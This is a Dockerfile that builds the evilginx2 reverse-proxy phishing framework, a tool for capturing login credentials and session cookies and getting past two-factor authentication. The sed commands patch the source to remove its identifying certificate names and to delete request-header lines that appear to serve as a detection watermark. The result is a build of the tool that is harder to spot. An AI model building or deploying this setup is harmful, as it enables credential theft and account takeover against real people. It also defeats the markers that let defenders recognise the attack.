FROM ubuntu:20.04

RUN apt-get -y update && apt-get -y dist-upgrade && \
        DEBIAN_FRONTEND=noninteractive apt-get install -y wget curl make nano git apt-utils && \
	GOLANG_LATEST_STABLE_VERSION=$(curl https://go.dev/dl/?mode=json | grep -o 'go.*.linux-amd64.tar.gz' | head -n 1 | tr -d '\r\n' ) && \
        cd /root && wget https://go.dev/dl/$GOLANG_LATEST_STABLE_VERSION && \
        rm -rf /usr/local/go && tar -C /usr/local -xzf $GOLANG_LATEST_STABLE_VERSION && \
        export PATH=$PATH:/usr/local/go/bin && \
        git clone https://github.com/kgretzky/evilginx2.git && \
        cd evilginx2 && \
	sed -i 's/"Evilginx Super-Evil Root CA"/time.Now().String()/g' ./core/certdb.go && \
	sed -i 's/"Evilginx Signature Trust Co."/time.Now().String()/g' ./core/certdb.go && \
  	sed -i /'o_host := req.Host'/d ./core/http_proxy.go && \
        sed -i /'req.Header.Set(p.getHomeDir(), o_host)'/d ./core/http_proxy.go && \
	sed -i /'req.Header.Set(string(hg),\ egg2)'/d ./core/http_proxy.go && \
        sed -i /'egg2\ :=\ req.Host'/d ./core/http_proxy.go && \
        sed -i 's/req.RemoteAddr/req.Header.Get("X-Real-IP")/g' ./core/http_proxy.go && \
        make && \
        apt-get -y autoremove && apt-get -y clean && rm -rf /var/lib/apt/lists/* && \
        ln -s /root/evilginx2 /opt/evilginx

WORKDIR /opt/evilginx

CMD ["/bin/bash"]
